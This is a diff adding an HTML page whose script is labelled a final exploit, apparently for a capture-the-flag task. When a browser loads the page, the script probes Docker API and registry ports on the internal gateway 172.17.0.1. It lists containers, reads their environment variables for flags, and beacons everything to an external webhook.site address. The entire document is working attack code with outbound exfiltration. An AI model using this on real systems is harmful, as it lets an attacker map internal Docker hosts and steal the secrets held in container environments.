@@ -1,0 +1,59 @@
+<!doctype html>
+<html><body><script>
+// FINAL EXPLOIT — load this page over PLAIN HTTP from any public host.
+// Beacons go to webhook bin + same-origin /log (either visible is fine).
+const OUT = [];
+function beacon(tag) {
+  const msg = tag + ' :: ' + OUT.join(' | ');
+  try { new Image().src = '/log?p=' + encodeURIComponent(msg); } catch (e) {}
+  try { new Image().src = 'https://webhook.site/6353f301-6064-4234-b5c8-361a00e129ba/?p=' + encodeURIComponent(msg); } catch (e) {}
+  OUT.length = 0;
+}
+OUT.push('boot14 ' + location.protocol + '//' + location.host);
+
+async function jget(url, ms) {
+  const ac = new AbortController();
+  const t = setTimeout(() => ac.abort(), ms);
+  try {
+    const r = await fetch(url, { mode: 'cors', cache: 'no-store', signal: ac.signal });
+    const text = await r.text();
+    clearTimeout(t);
+    return { status: r.status, text };
+  } finally { clearTimeout(t); }
+}
+
+(async () => {
+  beacon('boot');
+  const bases = ['http://172.17.0.1:2375', 'http://172.17.0.1:4243', 'http://172.17.0.1:5000', 'http://172.17.0.1:2376'];
+  for (const b of bases) {
+    try {
+      const v = await jget(b + '/version', 800);
+      OUT.push(`V ${b} ${v.status} ${v.text.slice(0, 200)}`);
+      beacon('ver' + b);
+    } catch (e) { OUT.push(`V ${b} ERR`); }
+    try {
+      const c = await jget(b + '/containers/json?all=1', 1500);
+      let ids = [];
+      try { ids = JSON.parse(c.text).map(x => ({ id: x.Id.slice(0, 12), img: x.Image, n: x.Names })); } catch (e) { OUT.push('list-parse-err'); }
+      OUT.push(`L ${b} ${c.status} n=${ids.length} ${JSON.stringify(ids.slice(0, 10))}`);
+      beacon('list' + b);
+      for (const it of ids.slice(0, 12)) {
+        try {
+          const d = await jget(b + '/containers/' + it.id + '/json', 1200);
+          const o = JSON.parse(d.text);
+          const env = (o.Config && o.Config.Env) || [];
+          const hit = env.filter(e => /flag|FLAG/i.test(e));
+          if (hit.length) OUT.push('FLAGFOUND ' + it.id + ' ' + hit.join(';'));
+          else OUT.push('E ' + it.id + ' ' + env.slice(0, 4).join(',').slice(0, 200));
+        } catch (e) { OUT.push('D ' + it.id + ' ERR'); }
+      }
+      beacon('env' + b);
+      if (OUT.some(x => x.startsWith('FLAGFOUND'))) break;
+    } catch (e) { OUT.push(`L ${b} ERR`); }
+  }
+  // registry fingerprint on 5000 as fallback
+  try { const r = await jget('http://172.17.0.1:5000/v2/_catalog', 800); OUT.push('REG ' + r.status + ' ' + r.text.slice(0, 300)); } catch (e) { OUT.push('REG ERR'); }
+  OUT.push('done14');
+  beacon('end');
+})();
+</script></body></html>
